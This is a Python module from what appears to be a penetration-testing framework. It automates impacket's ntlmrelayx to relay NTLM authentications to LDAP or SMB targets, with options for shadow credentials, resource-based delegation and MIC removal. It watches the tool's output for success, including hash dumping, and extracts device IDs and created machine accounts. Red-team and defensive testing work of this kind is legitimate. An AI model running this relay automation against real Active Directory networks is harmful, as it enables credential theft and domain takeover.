"""Async subprocess wrapper for impacket's ntlmrelayx.py.

ntlmrelayx is started as a **background process** that listens for
incoming NTLM authentications and relays them to a target service.
After coercion triggers authentication, the relay output is collected
and the process is terminated.

The typical flow is::

    relay = await start_relay(target_url, ...)
    # ... trigger coercion ...
    result = await wait_for_relay(relay, timeout=30)
    await stop_relay(relay)
"""

from __future__ import annotations

import asyncio
import logging
import re
import shlex
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger("pathstrike.tools.ntlmrelayx")


@dataclass
class RelaySession:
    """Tracks a running ntlmrelayx process."""

    process: asyncio.subprocess.Process
    command: list[str]
    stdout_lines: list[str] = field(default_factory=list)
    stderr_lines: list[str] = field(default_factory=list)
    _reader_task: asyncio.Task | None = None


_HELP_CACHE: dict[str, str] = {}


def _port_in_use(port: int) -> bool:
    """Return True if *port* is already bound on this host (any interface)."""
    import socket

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("0.0.0.0", port))
            return False
        except OSError:
            return True


async def _ntlmrelayx_supports(flag: str) -> bool:
    """Return True if the installed ntlmrelayx.py advertises *flag* in --help.

    Impacket's CLI surface drifts between versions — e.g. ``--smb2support``
    was removed once SMB2 became the default, and passing it to a newer build
    aborts startup with "unrecognized arguments".  Probing --help once (cached)
    lets us include version-specific flags only when they're actually accepted,
    so the relay works across impacket versions.
    """
    if "help" not in _HELP_CACHE:
        try:
            proc = await asyncio.create_subprocess_exec(
                "ntlmrelayx.py", "--help",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            out, err = await asyncio.wait_for(proc.communicate(), timeout=20)
            _HELP_CACHE["help"] = (out + err).decode("utf-8", errors="replace")
        except (asyncio.TimeoutError, FileNotFoundError, OSError):
            _HELP_CACHE["help"] = ""
    return flag in _HELP_CACHE["help"]


async def start_relay(
    target_url: str,
    auth_flags: list[str] | None = None,
    shadow_credentials: bool = False,
    shadow_target: str | None = None,
    delegate_access: bool = False,
    remove_mic: bool = True,
    smb2support: bool = True,
) -> RelaySession:
    """Start ntlmrelayx as a background listener.

    Args:
        target_url: Relay target (e.g. ``ldap://10.0.0.1``, ``smb://10.0.0.2``).
        auth_flags: Additional auth flags (rarely needed for relay).
        shadow_credentials: Use ``--shadow-credentials`` for LDAP relay.
        shadow_target: Target account for shadow credentials
            (e.g. ``DC01$``).
        delegate_access: Use ``--delegate-access`` for RBCD via LDAP relay.
        remove_mic: Remove MIC to bypass EPA (``--remove-mic``).
        smb2support: Enable SMB2 support (``--smb2support``).

    Returns:
        A :class:`RelaySession` that can be passed to :func:`wait_for_relay`
        and :func:`stop_relay`.
    """
    cmd: list[str] = ["ntlmrelayx.py", "-t", target_url]

    if shadow_credentials:
        cmd.append("--shadow-credentials")
        if shadow_target:
            cmd.extend(["--shadow-target", shadow_target])

    if delegate_access:
        cmd.append("--delegate-access")

    # ntlmrelayx starts an HTTP server on :80 by default. If something already
    # holds :80 (e.g. a local web service / the BloodHound stack), that server
    # thread crashes on bind and can take the whole relay down. SMB-based
    # coercion only needs the SMB server, so when :80 is occupied we drop the
    # HTTP listener instead of letting it fail.
    if _port_in_use(80) and await _ntlmrelayx_supports("--no-http-server"):
        cmd.append("--no-http-server")
        logger.info("Local :80 in use — starting relay without the HTTP server")

    if remove_mic and await _ntlmrelayx_supports("--remove-mic"):
        cmd.append("--remove-mic")

    # --smb2support only exists on older impacket; on modern builds SMB2 is the
    # default and the flag is rejected ("unrecognized arguments"). Add it only
    # when this ntlmrelayx actually advertises it.
    if smb2support and await _ntlmrelayx_supports("--smb2support"):
        cmd.append("--smb2support")

    if auth_flags:
        cmd.extend(auth_flags)

    logger.info("Starting relay: %s", " ".join(shlex.quote(c) for c in cmd))

    from pathstrike.engine.command_emitter import record_command
    if record_command("ntlmrelayx", cmd, redacted=" ".join(shlex.quote(c) for c in cmd)):
        # Emit mode: record the relay command, don't spawn. Return a session
        # with a stub process so stop_relay()/teardown are no-ops.
        class _EmitProc:
            returncode = 0
            pid = 0
        return RelaySession(process=_EmitProc(), command=cmd)

    # ntlmrelayx runs an interactive "ntlmrelayx>" console on its main thread
    # that reads from stdin.  Launched without a terminal, stdin hits EOF
    # immediately, the console loop returns, and the process exits (rc 0) —
    # tearing down the daemon server threads right after "Servers started".
    # Handing it an *open* stdin pipe (that we never close until teardown)
    # makes the console block instead of EOF-ing, so the relay stays up.
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    session = RelaySession(process=proc, command=cmd)

    # Start a background task that continuously reads stdout
    async def _read_output():
        assert proc.stdout is not None
        while True:
            line = await proc.stdout.readline()
            if not line:
                break
            decoded = line.decode("utf-8", errors="replace").rstrip()
            session.stdout_lines.append(decoded)
            logger.debug("[ntlmrelayx] %s", decoded)

    session._reader_task = asyncio.create_task(_read_output())

    # Give ntlmrelayx a moment to bind its listener
    await asyncio.sleep(2)

    if proc.returncode is not None:
        # Process exited immediately — likely a port conflict or bad args
        stderr = ""
        if proc.stderr:
            stderr = (await proc.stderr.read()).decode("utf-8", errors="replace")
        session.stderr_lines.append(stderr)
        logger.error("ntlmrelayx exited immediately (rc=%d): %s", proc.returncode, stderr)

    return session


async def wait_for_relay(
    session: RelaySession,
    timeout: int = 30,
    success_pattern: str | None = None,
) -> dict[str, Any]:
    """Wait for ntlmrelayx to capture and relay authentication.

    Monitors the process output for success indicators.

    Args:
        session: A running :class:`RelaySession`.
        timeout: Maximum seconds to wait for a successful relay.
        success_pattern: Custom regex to match success in output.
            Defaults to common ntlmrelayx success messages.

    Returns:
        Standardised result dict.
    """
    if success_pattern is None:
        # Common ntlmrelayx success indicators
        success_pattern = (
            r"HTTPD\(443\): Authenticating|"
            r"Target.*authenticated|"
            r"Delegation.*succeeded|"
            r"Adding Shadow Credentials|"
            r"shadow credentials.*added|"
            r"RBCD.*set|"
            r"Dumping.*hashes|"
            r"Authentication.*succeeded|"
            r"relay.*succeeded"
        )

    compiled = re.compile(success_pattern, re.IGNORECASE)
    start = asyncio.get_event_loop().time()

    while (asyncio.get_event_loop().time() - start) < timeout:
        # Check if relay already succeeded
        for line in session.stdout_lines:
            if compiled.search(line):
                return {
                    "success": True,
                    "output": "\n".join(session.stdout_lines),
                    "matched_line": line,
                    "tool": "ntlmrelayx.py",
                }

        # Check if process died
        if session.process.returncode is not None:
            break

        await asyncio.sleep(1)

    # Timeout or process died
    output = "\n".join(session.stdout_lines)
    stderr = "\n".join(session.stderr_lines)

    return {
        "success": False,
        "output": output,
        "error": stderr or f"Relay did not succeed within {timeout}s",
        "tool": "ntlmrelayx.py",
    }


async def stop_relay(session: RelaySession) -> None:
    """Terminate the ntlmrelayx process and clean up.

    Args:
        session: The relay session to stop.
    """
    if session.process.returncode is None:
        logger.info("Stopping ntlmrelayx (pid=%d)", session.process.pid)
        session.process.terminate()
        try:
            await asyncio.wait_for(session.process.wait(), timeout=5)
        except asyncio.TimeoutError:
            logger.warning("ntlmrelayx did not exit gracefully, killing")
            session.process.kill()
            await session.process.wait()

    if session._reader_task and not session._reader_task.done():
        session._reader_task.cancel()
        try:
            await session._reader_task
        except asyncio.CancelledError:
            pass

    logger.info("ntlmrelayx stopped")


def extract_shadow_creds_device_id(output: str) -> str | None:
    """Extract the Shadow Credentials device ID from ntlmrelayx output.

    Returns the device ID string, or None.
    """
    match = re.search(r"DeviceID:\s*([a-fA-F0-9-]+)", output)
    return match.group(1) if match else None


def extract_delegated_account(output: str) -> str | None:
    """Extract the created machine account name from --delegate-access output.

    Returns the account name (e.g. ``YOURPC$``), or None.
    """
    match = re.search(r"Account.*?:\s*(\S+\$)", output)
    return match.group(1) if match else None
